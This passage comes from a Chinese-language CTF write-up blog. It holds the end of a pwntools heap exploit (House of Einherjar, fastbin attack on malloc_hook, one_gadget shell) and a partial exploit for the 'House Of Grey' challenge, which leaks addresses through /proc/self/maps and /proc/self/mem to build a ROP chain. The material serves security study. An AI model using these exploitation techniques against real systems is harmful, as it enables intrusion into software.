    sla<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Size:'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'Data:'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#def q():</span>
<span class="token comment" spellcheck="true">#    sla(':', str(5))</span>

<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ad<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 0</span>
    ad<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 1</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'C'</span> <span class="token operator">*</span> <span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 2</span>
    ad<span class="token punctuation">(</span><span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token string">'E\n'</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># idx 3</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'F\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#for avoid merge to top chunk</span>
    rm<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># use house of einherjar</span>
    p <span class="token operator">=</span> <span class="token string">'C'</span> <span class="token operator">*</span> <span class="token number">0x60</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x190</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

    rm<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#for fastbin attack, now make it in fastbin</span>
    <span class="token comment" spellcheck="true"># trigger house of eiherjar</span>
    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># leak main_arena</span>
    ad<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
    dp<span class="token punctuation">(</span><span class="token punctuation">)</span>
    main_arena <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\x7f\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x58</span>
    libc_base <span class="token operator">=</span> main_arena <span class="token operator">-</span> <span class="token number">0x3c4b20</span>
    li<span class="token punctuation">(</span><span class="token string">'main_arena '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>main_arena<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base '</span> <span class="token operator">+</span>  hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># fastbin attack to malloc_hook - 0x23</span>
    p <span class="token operator">=</span> <span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token number">0x80</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_arena <span class="token operator">-</span> <span class="token number">0x33</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> <span class="token string">'\n'</span>
    ad<span class="token punctuation">(</span><span class="token number">0xA0</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#for ajust fastbin</span>
    <span class="token comment" spellcheck="true">#modify malloc_hook</span>
    realloc_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span>
    li<span class="token punctuation">(</span><span class="token string">'realloc_addr '</span> <span class="token operator">+</span>  hex<span class="token punctuation">(</span>realloc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    gadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span> <span class="token number">0x4526a</span><span class="token punctuation">,</span> <span class="token number">0xf02a4</span><span class="token punctuation">,</span> <span class="token number">0xf1147</span><span class="token punctuation">]</span>
    one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> gadget<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
    p <span class="token operator">=</span> <span class="token string">'\x11'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x13</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#mallok_hook then call realloc for banance stackthen call one_gadget</span>

    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>realloc_addr <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> <span class="token string">'\n'</span>
    ad<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># get shell</span>
    sl<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#db()</span>

<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libFile<span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''</span></code></pre>
<h1 id="House-Of-Grey"><a href="#House-Of-Grey" class="headerlink" title="House Of Grey"></a>House Of Grey</h1><h2 id="来源-3"><a href="#来源-3" class="headerlink" title="来源"></a>来源</h2><p>World of Attack &amp; Defense</p>
<h2 id="难度-2"><a href="#难度-2" class="headerlink" title="难度"></a>难度</h2><p>8 / 10</p>
<h2 id="保护-3"><a href="#保护-3" class="headerlink" title="保护"></a>保护</h2><pre class=" language-text"><code class="language-text">    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled</code></pre>
<h2 id="简单描述-2"><a href="#简单描述-2" class="headerlink" title="简单描述"></a>简单描述</h2><p>该题没有明显的分界点, 涉及的知识也比较陌生,十分经典. 通过创建子进程方式避免被直接调试,且有记时,保护全开,要理解linux下的一些文件.如 /proc/self/下的文件,通过seccomp-tools检验程序, 发现禁用execve函数,只能通过open,read,write获取flag</p>
<h2 id="vul-4"><a href="#vul-4" class="headerlink" title="vul"></a>vul</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">fn</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> __int64 v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rsi</span>
  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-70h]</span>
  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+14h] [rbp-6Ch]</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-64h]</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-64h]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-60h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//---------------------stack ouverflow</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+48h] [rbp-38h]</span>
  <span class="token keyword">char</span> nptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+50h] [rbp-30h]</span>
  <span class="token keyword">unsigned</span> __int64 v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+78h] [rbp-8h]</span>
  __int64 savedregs<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+80h] [rbp+0h]</span>

  v10 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You get into my room. Just find something!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100000uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v6 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"malloc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_14D2</span><span class="token punctuation">(</span><span class="token number">100000LL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v8 <span class="token operator">=</span> v6<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">29</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">sub_FEE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>savedregs <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">case</span> <span class="token number">1u</span><span class="token punctuation">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"So man, what are you finding?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token comment" spellcheck="true">//length 40 can be stack overflow--------</span>
        buf<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">40uLL</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">check</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//不能读取flag文件</span>
        <span class="token punctuation">{</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Man, don't do it! See you^."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> fd <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">2u</span><span class="token punctuation">:</span> 
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"So, Where are you?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nptr<span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v1 <span class="token operator">=</span> <span class="token function">strtoull</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>nptr<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> v1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//可以定位fd的地址</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">3u</span><span class="token punctuation">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How many things do you want to get?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>nptr<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        v4 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">&lt;=</span> <span class="token number">100000</span> <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          v5 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> v8<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
          <span class="token punctuation">{</span>
            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"error read"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You get something:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> v8<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You greedy man!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">4u</span><span class="token punctuation">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What do you want to give me?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v8<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">// v8 can be modifyed</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">5u</span><span class="token punctuation">:</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
      <span class="token keyword">default</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nI guess you don't want to say Goodbye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"But sadly, bye! Hope you come again!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>vul: 存在堆栈溢出, 通过覆盖 v8实现任意地址读写</p>
<h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><p>由于可以读取除了flag之外的文件，就可以读取/proc/self/maps文件,Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。该文件不能直接读取，需要结合maps的映射信息来确定读的偏移值。即无法读取未被映射的区域，只有读取的偏移值是被映射的区域才能正确读取内存内容。</p>
<p>程序最后有一个exit(0)，由此，覆盖fn函数的返回地址来构造ROP不可行，但可以覆盖read函数的返回地址，也就是调用read任意写时，把自己的返回地址给覆盖了,这样ROP写入后就直接开始执行了。为了覆盖read的返回地址，就需要确定栈的地址。</p>
<p>但是，由于程序是clone出来的，第三个参数指定了clone出的进程的栈地址，程序一开始用mmap映射了一段内存，然后取了其中的一个随机的位置传给了clone，由此，并不知道程序的栈地址。但是，可以通过读取/proc/self/mem文件，来搜索标记，已确定程序的栈地址, 注意,堆栈的生长方向是由高地址向低地址生长。</p>
<h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><ol>
<li>如何调试? 使用ida把超时函数的exit给patch掉, 通过gdb attach的方式调试子进程</li>
<li>漏洞 1: 明显的漏洞点就在执行1功能的时候就有字符串溢出, 可以覆盖v8变量通过4功能实现任意地址写入.</li>
<li>漏洞 2: 可以通过输入打开文件为 /proc/self/maps来获取各个基址</li>
<li>绕过PIE，以及利用/proc/self/mem来读取任意地址的内容</li>
<li>通过在/proc/self/mem中搜索’/proc/self/maps’字符串来定位堆栈的地址</li>
<li>计算出read ret地址,构造rop链读取flag</li>
</ol>
<h2 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h2><h3 id="获取基址"><a href="#获取基址" class="headerlink" title="获取基址"></a>获取基址</h3><pre class=" language-python"><code class="language-python">    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#leaking base addr</span>
    p <span class="token operator">=</span> <span class="token string">'/proc/self/maps'</span>
    fid<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    get<span class="token punctuation">(</span><span class="token number">1500</span><span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">'You get something:\n'</span><span class="token punctuation">)</span>
    exe_base <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'[heap]\n'</span><span class="token punctuation">)</span>
    stack_start <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
    stack_end <span class="token operator">=</span>   int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

    ru<span class="token punctuation">(</span><span class="token string">'rw-p 00000000 00:00 0 \n'</span><span class="token punctuation">)</span>

    libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'exe_base  '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>exe_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

    li<span class="token punctuation">(</span><span class="token string">'stack_start '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>stack_start<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'stack_end   '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>stack_end<span class="token punctuation">)</span><span class="token punctuation">)</span>

    pop_rdi_ret_offset <span class="token operator">=</span> <span class="token number">0x1823</span>
    pop_rsi_r15_ret_offset <span class="token operator">=</span> <span class="token number">0x1821</span>
    pop_rdi_ret <span class="token operator">=</span> exe_base <span class="token operator">+</span> pop_rdi_ret_offset
    pop_rsi_r15_ret <span class="token operator">=</span> exe_base <span class="token operator">+</span> pop_rsi_r15_ret_offset
    open_plt <span class="token operator">=</span> exe_base <span class="token operator">+</span> exe<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span>
    read_plt <span class="token operator">=</span> exe_base <span class="token operator">+</span> exe<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
    puts_plt <span class="token operator">=</span> exe_base <span class="token operator">+</span> exe<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span></code></pre>
<h3 id="搜索内存定位read-ret地址"><a href="#搜索内存定位read-ret地址" class="headerlink" title="搜索内存定位read ret地址"></a>搜索内存定位read ret地址</h3><p>接下来，就需要读取/proc/self/mem来搜索内存，确定栈地址了</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">29</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">sub_FEE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre>
<p>通过以上逻辑,程序只可以循环使用30次, 前面使用了4次, ，最后还需要用2次,搜索内存只能使用24次.</p>
<p>而每次最多允许读取100000个字节的数据，由此，能搜索2400000个字节的内容，通过调试，观察数据的栈地址，计算它与stack_end的值的差值，做一个大致的范围,由于栈是从高往低增长的，因此，应该从stack_end – x ~ stack_end搜索</p>
<pre class=" language-python"><code class="language-python">    <span class="token comment" spellcheck="true">#position stack addr</span>
    offset <span class="token operator">=</span> <span class="token number">0xf800000</span>
    li<span class="token punctuation">(</span><span class="token string">'debug---------------'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#begin_offset ~ stack_end</span>
    stack_begin_offset <span class="token operator">=</span> stack_end <span class="token operator">-</span> offset <span class="token operator">-</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">100000</span>
    li<span class="token punctuation">(</span><span class="token string">'stack_begin_offset '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>stack_begin_offset<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'stack_end   '</span> <span class="token operator">+</span>        hex<span class="token punctuation">(</span>stack_end<span class="token punctuation">)</span><span class="token punctuation">)</span>

    fid<span class="token punctuation">(</span><span class="token string">'/proc/self/mem'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#打开该时起始地址为0,则偏移直接为stack_begin_offset地址</span>
    loc<span class="token punctuation">(</span>stack_begin_offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#loacate in stack_begin_offset</span>
    <span class="token comment" spellcheck="true"># searching</span>
